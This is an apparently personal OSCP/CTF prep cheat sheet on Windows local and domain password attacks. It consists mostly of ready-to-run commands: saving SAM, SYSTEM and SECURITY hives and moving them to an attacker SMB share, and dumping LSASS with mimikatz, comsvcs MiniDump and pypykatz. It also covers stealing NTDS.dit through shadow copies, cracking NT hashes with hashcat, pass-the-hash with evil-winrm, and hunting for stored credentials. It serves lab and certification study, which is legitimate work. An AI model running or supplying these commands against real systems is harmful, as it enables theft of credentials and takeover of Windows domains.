---
title: "Windows Local Password Attacks"
date: 2025-08-08
categories: ["CTF", "OSCP Prep", "Windows", "PE"]
tags: ["Windows", "Windows Password Attacks", "privilege escalation", "SAM", "LSASS", "mimikatz", "ntds"]
description: "Techniques with guides on how to exploit various Windows Groups to elevate privileges"
---

# Attacking SAM

```cmd
## Using `reg.exe` to Copy Registry Hives (requires admin)
## REMEMBER `RUN THE CMD AS ADMIN`

reg.exe save hklm\sam C:\sam.save

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```

```bash
## Explanation
- python3 /../smbserver.py -smb2support : Creates the Share
- CompData : Give the Share a name
- /home/ltndotpirate/Documents/ : Where the share will be storitng data

## On Kali (10.10.15.16)
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltndotpirate/Documents/


## On Windows
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```
## Dumping Hashes - Impacket secretsdump.py

```bash
## Using secretsdup.py
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
## Cracking Hashes with Hashcat
```bash
## Pupulate a .txt file with NT hashes (dumped from secretsdump)
cat hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2

## Start cracking
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

```
## Remote Dumping & LSA Secrets Considerations
```bash
## With access to credenials with (local admin privileges) we might be able to extract credentials from a `running service`, `scheduled task` or `application` that uses `LSA secrets to store passwords`.

## Dumping LSA secrets
## Using Crackmapexec | Netexec
crackmapexec smb 10.10.10.13 --local-auth -u dotpirate -p HTB_@cademy_stdnt! --lsa


## Dumping SAM remotely
crackmapexec smb 10.10.10.13 --local-auth -u dotpirate -p Passw0rd123 --sam
```
## Dumping LOCAL-Hashes with Mimikatz (On Windows CMD)

```cmd
## Steps
(1) Extract `SYSTEM` and `SAM` regictry hives from local machine.

reg save HKLM\sam C:\sam.save
reg save HKLM\system C:\system.save

(2) Run mimikatz

mimikatz.exe

(3) Elevate priviliages in mimikatz

privilege::debug
token::elevate

(4) Proceed to dump the local-hashes

lsadump::sam system.save sam.save

(5) List LM & NTLM credentials

sekurlsa::msv
```

## Dumping Hashes for all Logged-on Users to the Current Workstation (AD included)

```cmd
.\mimikatz.exe

privilege::debug

sekurlsa::logonpasswords
```

---
---



# Attacking LSASS

## Dumping LSASS Process Memory
```mysql
## Task Manager Method
Open Task Manager > Select the Process tab > Find & right click on the Local Security Authority Process > Select Create dump file
```

```bash
## A file called lsass.DMP is created and saved in the following path:
C:\Users\loggedonusersdirectory\AppData\Local\Temp

## NOTE: Its Always better to tranfer the files to our attacking machine for cracking
```
## Rundll32.exe && Comsvcs.dll Method & Pypykatz
```cmd
## Before issuing a command to create a dump file, we must determine what `process ID (PID) is assigned to lsass.exe`. This can be done from both CMD and POWERSHELL:

## Finding LSASS PID in CMD (as admin)
tasklist /svc
## Finding LSASS PID in POWERSHELL (as admin)
Get-Process lsass

### Creating lsass.dmp using powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

## Explanation of the above command
- rundll32 C:\windows\system32\comsvcs.dll : Running 'rundll32' to call an exported function 'comsvcs.dll' which calls 'MiniDumpWrite' function to dump LSASS process memory
- 672 : lsass.exe PID
- C:\lsass.dump : Specifies directory where the dump is stored
```
## Pypykatz
```bash
## Using `Pypykatz` to extract credentials after getting the lsass.dmp
## Once we have the lsass.dmp file on our Linux-machine we can proceed to extract the secrets from it.

sudo pypykatz lsa minidump /home/addict/lsass.dmp

## Explanation
- lsa : use `lsa` in the command because LSASS is a subsystem of `local security authority`
- minidump : we specify the data source as a `minidump` file
- /home/addict/lsass.dmp :  path to the dump file
```

---
---


# Attacking AD & NTDS.dit

```bash
## From MITRE
NTDS file location: %SystemRoot%\NTDS\Ntds.dit (in the domain cotroller)
Resource: https://attack.mitre.org/techniques/T1003/003/
```
## Dictionary Attacks against AD
```bash
## Creating Custom list of Usernames
## Browse target site and find potential employeenames
cat usernames

Ben Williamson
dotpirate Burgerstien
Jim Stevenson
Jill Johnson
Jane Doe

## Using username-anarchy (automation)
sudo git clone https://github.com/urbanadventurer/username-anarchy.git

./username-anarchy -i usernames

## Using Crackmapexec 
sudo crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
## Capturing NTDS.dit
```bash
## Connecting to DC with Evil-WinRM
sudo evil-winrm -i 10.129.202.57 -u bwilliamson -p 'P#55w0rd!'

## Checking Local Group Policy
C:\> net localgroup

## Checking User Account Privileges inclidung Domain
C:\> net user bwilliamson

## Creating Shadow Copy of C: using `vssadmin`
PS C:\> vssadmin CREATE SHADOW /For=C:

## Copying NTDS.dir from the VSS
## We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

## On Kali (10.10.15.30)
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltndotpirate/Documents/

## On Windows
PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData

PS C:\> reg.exe save hklm\system C:\system.save

PS C:\> move system.save \\10.10.15.30\CompData

## Extracting ntds using secretsdump.py
sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ./NTDS.dit -system system.save -hashes lmhash:nthash LOCAL -outputfile ntlm-extract


## Hashcat to crack the captured hashes
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

```
## Capturing NTDS.dit with Crackmapexec
```bash
sudo crackmapexec smb 10.129.201.57 -u bwilliamson -p 'P@55w0rd!' --ntds
```
## Pass-the-Hash with Evil-WinRM Example
```bash
sudo evil-winrm -i 10.129.201.57 -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

---
---
# Credential Hunting

## Key-Terms-to-Search

```cmd
## Using `Lazagne.exe` to discover credentials from web-browsers

start lazagne.exe all
```
Resource: [Binary](https://github.com/AlessandroZ/LaZagne/releases/)

## Searching for files
```cmd
## Using `findstr` to search from patterns
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

± 'IIS' information such as 'credentials' may be stored in a 'web.config' file. For the default IIS website, this could be located at 'C:\inetpub\wwwroot\web.config'
```
## Dictionary Files
## Chrome Dictionary Files
```cmd
PS C:\htb> gc 'C:\Users\dotpirate\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
## Unattended Installation
### Unattend.xml
```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

## Mozilla

```cmd
PS> cd  "C:\Users\dotpirate\AppData\Local\Mozilla\Firefox\Profiles\"

Get in one file of the profiles and search for a json file called 'activity-stream.discovery_stream.json'
```

## PowerShell History File
```cmd
# Powershell 5.0 in Windows 10, PowerShell stores command history to the file

`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
```

```cmd
PS C:\htb> (Get-PSReadLineOption).HistorySavePath
```
## Reading PowerShell History File
```cmd
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath

# Output
dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\ 
.... 
```
#### We can also use this one-liner to retrieve the contents of all PowerShell history files that we can access as our current user.
```cmd
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
## PowerShell Credentials
```mysql 
PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using '[DPAPI]', which typically means they can only be decrypted by the same user on the same computer they were created on.

Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.
```
```cmd
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'dotpirate_adm' -Password $decryptedPassword
```
## Decrypting PowerShell Credentials
```cmd
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username
# Output
dotpirate
```cmd
PS C:\htb> $credential.GetNetworkCredential().password
# Output
Str0ng3ncryptedP@ss!
```


```mysql
## Other places to look for:
    Passwords in Group Policy in the SYSVOL share
    Passwords in scripts in the SYSVOL share
    Password in scripts on IT shares
    Passwords in web.config files on dev machines and IT shares
    unattend.xml
    Passwords in the AD user or computer description fields
    KeePass databases --> pull hash, crack and get loads of access.
    Found on user systems and shares
	Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, 
	shares, Sharepoint
```

